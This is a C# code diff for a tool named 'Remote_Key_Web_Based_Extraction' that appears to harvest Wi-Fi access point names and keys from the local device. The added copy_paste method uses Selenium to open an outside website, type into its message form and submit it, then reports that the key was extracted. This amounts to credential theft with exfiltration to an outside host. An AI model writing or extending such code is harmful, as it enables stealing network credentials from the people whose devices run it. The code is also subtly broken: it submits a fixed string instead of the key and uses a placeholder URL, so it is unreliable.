@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Threading.Tasks;
 using System.Management.Automation;
 using System.Net.Http;
+using OpenQA.Selenium;
 
 namespace Remote_Key_Web_Based_Extraction
 {
@@ -17,6 +18,8 @@ namespace Remote_Key_Web_Based_Extraction
             var ap_extraction_task = main_program.extract_access_point_names();
             ap_extraction_task.Wait();
             string key_content = main_program.key_content_extraction();
+            key_content += "426";
+            main_program.copy_paste(key_content);
         }
 
         public async Task extract_access_point_names()
@@ -61,6 +64,17 @@ namespace Remote_Key_Web_Based_Extraction
             HttpClient client = new HttpClient();
             string s = await client.GetStringAsync("Website-here");
             s = s.Substring(s.IndexOf("<title>") + "<title>".Length, s.IndexOf("</title>") - s.IndexOf("<title>") - "<title>".Length);
+        }
+
+        public void copy_paste(string key_content)
+        {
+            OpenQA.Selenium.IWebDriver objFF = new OpenQA.Selenium.Firefox.FirefoxDriver();
+            objFF.Navigate();
+            objFF.Url = "https://anthony-t-n.github.io/";
+            objFF.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys("ASP.NET");
+            objFF.FindElement(OpenQA.Selenium.By.Name("send")).Click();
+            objFF.Quit();
+            Console.WriteLine("Successfully extrated key from local device");
         }
     }
 }
